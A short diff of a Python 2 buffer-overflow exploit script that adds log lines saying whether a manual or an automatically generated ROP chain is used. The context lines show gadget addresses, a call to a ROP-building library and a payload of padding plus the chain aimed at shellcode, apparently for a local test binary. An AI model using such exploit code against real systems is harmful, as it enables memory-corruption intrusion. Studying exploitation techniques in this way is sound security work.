@@ -26,6 +26,8 @@ target_address = buffer_address + 1024
 print "shellcode address: 0x{:x}".format(target_address)
 
 if len(sys.argv) < 2: # manual mode
+  print "Using manually built ROP chain"
+
   POP_RDI = 0x40063f # pop rdi ; ret
   POP_RSI = 0x400641 # pop rsi ; ret
   POP_RDX = 0x400643 # pop rdx ; ret
@@ -50,6 +52,7 @@ if len(sys.argv) < 2: # manual mode
     + p64(target_address)
   )
 else:
+  print "Using automatically built ROP chain"
   rop = ropme.rop_to_shellcode([(filename, 0)], target_address)
 
 payload = 'A'*512 + 'B'*8 + rop
